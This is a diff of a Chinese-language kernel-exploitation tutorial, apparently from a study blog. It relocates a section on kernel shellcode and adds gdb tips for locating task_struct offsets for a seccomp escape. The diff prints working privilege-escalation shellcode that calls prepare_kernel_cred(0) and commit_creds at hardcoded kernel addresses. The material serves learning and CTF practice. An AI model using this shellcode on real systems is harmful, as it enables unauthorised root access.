@@ -250,27 +250,7 @@ call rax
 利用速记宏，开发一下内核代码，将其编译成二进制，查看他的汇编:<br>
 ![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2025-9-25/20250906152928.png)
 
-## 5.3 常见的kernel shellcode<br>
-### 5.3.1 权限提升<br>
-先前提到，权限提升通常是执行`commit_creds(init_cred)`来完成，所以在能够在内核态下执行shellcode时，我们可以编写shellcode执行`commit_creds(init_cred)`即可完成提权。<br>
-```c
-__attribute__((naked,noinline)) void privilege_escalation_kernel_shellcode(){
-    __asm__ (
-        "mov rbx, 0xffffffff810895e0;" //prepare_kernel_cred_addr
-        "mov rdi, 0;"
-        "call rbx;"     //prepare_kernel_cred(0)
-        "mov rdi, rax;" 
-        "mov rbx, 0xffffffff810892c0;" //commit_creds_addr
-        "call rbx;"
-        "nop;"
-        "ret;"
-    );
-}
-// gcc -fcf-protection=none -masm=intel  xxx.c -o xxx
-// -fcf-protection=none 可以去除函数开头的endbr64指令，__attribute__((naked,noinline)) 会让编译器忽略给该函数添加栈帧操作
-```
-### 5.3.2 seccomp逃逸<br>
-用#5.2节提到的方法，我们需要自己编译一个内核模块:<br>
+**实操步骤如下:**<br>
 内核模块代码:<br>
 ```c
 // simple.c
@@ -305,6 +285,34 @@ clean:
 **需要注意的是，实际上current->thread_info.flags不是gs:0x0的位置，我们需要手动确定其偏移：可以通过`p/x &current_task`在gdb中查看偏移**<br>
 或者，将编译好的驱动通过`insmod`安装到内核当中，可以通过gdb调试获取相应位置:<br>
 ![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2025-9-25/20250927135007.png)
+
+
+
+## 5.3 常见的kernel shellcode<br>
+### 5.3.1 权限提升<br>
+先前提到，权限提升通常是执行`commit_creds(init_cred)`来完成，所以在能够在内核态下执行shellcode时，我们可以编写shellcode执行`commit_creds(init_cred)`即可完成提权。<br>
+```c
+__attribute__((naked,noinline)) void privilege_escalation_kernel_shellcode(){
+    __asm__ (
+        "mov rbx, 0xffffffff810895e0;" //prepare_kernel_cred_addr
+        "mov rdi, 0;"
+        "call rbx;"     //prepare_kernel_cred(0)
+        "mov rdi, rax;" 
+        "mov rbx, 0xffffffff810892c0;" //commit_creds_addr
+        "call rbx;"
+        "nop;"
+        "ret;"
+    );
+}
+// gcc -fcf-protection=none -masm=intel  xxx.c -o xxx
+// -fcf-protection=none 可以去除函数开头的endbr64指令，__attribute__((naked,noinline)) 会让编译器忽略给该函数添加栈帧操作
+```
+### 5.3.2 seccomp逃逸<br>
+用#5.2节提到的方法，我们需要自己编译一个内核模块:<br>
+**如果你觉得编译内核太麻烦了，这里有其他方法：commit_cred函数里会用到current宏，所以我们可以直接查看commit_cred函数的汇编即可获取其位置**<br>
+![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2025-9-25/20251009230737.png)
+gdb可以通过`p {struct task_struct} ($gs_base+0x15d00)`来查看结构体:<br>
+![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2025-9-25/20251009231721.png)
 
 随后，可以利用`pwntools`的汇编模块来帮助我们生成shellcode:<br>
 ```python
